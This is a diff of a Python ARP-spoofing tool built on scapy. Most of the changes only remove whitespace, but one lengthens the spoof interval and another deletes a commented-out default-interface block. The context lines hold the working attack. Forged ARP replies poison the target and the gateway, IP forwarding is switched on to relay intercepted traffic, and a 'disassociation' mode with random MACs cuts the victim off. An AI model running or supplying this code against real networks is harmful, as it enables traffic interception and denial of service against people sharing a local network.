@@ -17,11 +17,11 @@ class ArpSpoofer:
 				self.interface = args.interface if args.interface is not None else self.get_active_interface()
 				self.disassociate_flag = args.disassociate
 				self.ipforward = args.ipforward
-				
+
 				self.target_mac = self.get_mac(self.target_ip)
 				self.gateway_mac = self.get_mac(self.gateway_ip)
 				self.attacker_ip, self.attacker_mac = self.get_attacker_info(self.interface)
-				
+
 				print(Fore.CYAN + "[+] Interface:", self.interface)
 				print(Fore.CYAN + "[+] Target IP:", self.target_ip)
 				print(Fore.CYAN + "[+] Gateway IP:", self.gateway_ip)
@@ -31,24 +31,24 @@ class ArpSpoofer:
 				print(Fore.CYAN + "[+] Attacker MAC:", self.attacker_mac)
 				print(Fore.CYAN + "[+] IP Forwarding:", "Enabled" if self.ipforward else "Disabled")
 				print(Fore.CYAN + "[+] Disassociation Mode:", "Enabled" if self.disassociate_flag else "Disabled")
-				
+
 				if self.ipforward:
 						self.enable_ip_forward()
-		
+
 		def get_active_interface(self):
 				gateways = netifaces.gateways()
 				default_gateway = gateways.get('default', {})
 				if netifaces.AF_INET in default_gateway:
 						return default_gateway[netifaces.AF_INET][1]
 				return None
-		
+
 		def get_router_ip(self):
 				gateways = netifaces.gateways()
 				default_gateway = gateways.get('default', {})
 				if netifaces.AF_INET in default_gateway:
 						return default_gateway[netifaces.AF_INET][0]
 				return None
-		
+
 		def get_mac(self, ip):
 				request = scapy.ARP(pdst=ip)
 				broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
@@ -57,7 +57,7 @@ class ArpSpoofer:
 				if ans:
 						return ans[0][1].hwsrc
 				return None
-		
+
 		def get_attacker_info(self, iface):
 				try:
 						addrs = netifaces.ifaddresses(iface)
@@ -71,34 +71,34 @@ class ArpSpoofer:
 				except Exception as e:
 						print(Fore.RED + "[!] Error retrieving attacker info on interface", iface, ":", e)
 						return None, None
-		
+
 		def spoof(self,t_ip,t_mac,send_ip,send_mac):
 				reply = scapy.ARP(op=2, pdst=t_ip, hwdst=t_mac, psrc=send_ip,hwsrc=send_mac)
 				packet=scapy.Ether(dst=t_mac)/reply
 				scapy.sendp(packet, iface=self.interface, verbose=False)
 				print(Fore.YELLOW + "[+] Sent ARP reply to", self.target_ip, "spoofing as", self.gateway_ip)
-		
+
 		def restore(self,t_ip,t_mac,send_ip,send_mac):
 				reply = scapy.ARP(op=2, pdst=t_ip, hwdst=t_mac, psrc=send_ip, hwsrc=send_mac)
 				packet=scapy.Ether(dst=t_mac)/reply
 				scapy.sendp(packet, iface=self.interface, count=5, verbose=False)
 				print(Fore.GREEN + "[+] Restored ARP table for", t_ip)
-		
+
 		def enable_ip_forward(self):
 				with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
 						f.write("1")
 				print(Fore.MAGENTA + "[+] IP forwarding enabled")
-		
+
 		def random_mac_gen(self):
 				hexchars = "ABCDEF01234567"
 				return ":".join(''.join(random.choices(hexchars, k=2)) for _ in range(6))
-		
+
 		def disassociate(self):
 				rand_mac = self.random_mac_gen()
 				packet = scapy.ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, psrc=self.gateway_ip, hwsrc=rand_mac)
 				scapy.send(packet, iface=self.interface, verbose=False)
 				print(Fore.RED + "[+] Sent disassociation packet with random MAC", rand_mac)
-		
+
 		def execute(self):
 				try:
 						while True:
@@ -107,7 +107,7 @@ class ArpSpoofer:
 								else:
 										self.spoof(self.target_ip,self.target_mac,self.gateway_ip,self.attacker_mac)
 										self.spoof(self.gateway_ip,self.gateway_mac,self.target_ip,self.attacker_mac)
-								time.sleep(2)  # Adjust as necessary
+								time.sleep(10)  # Adjust as necessary
 				except KeyboardInterrupt:
 						print(Fore.RED + "[!] Detected CTRL+C, restoring ARP tables...")
 						self.restore(self.target_ip,self.target_mac,self.gateway_ip,self.gateway_mac)
@@ -122,12 +122,6 @@ if __name__ == "__main__":
 		parser.add_argument("-d", "--disassociate", action="store_true", help="Enable disassociation attack (random MAC)")
 		parser.add_argument("-ipf", "--ipforward", action="store_true", help="Enable IP forwarding to maintain victim-router connection")
 		args = parser.parse_args()
-		
-		# If interface or gateway not provided, default to system values
-#		if args.interface is None:
-#				args.interface = get_active_interface()
-#		if args.gateway is None:
-#				args.gateway = get_router_ip()
-		
+
 		spoofer = ArpSpoofer(args)
 		spoofer.execute()
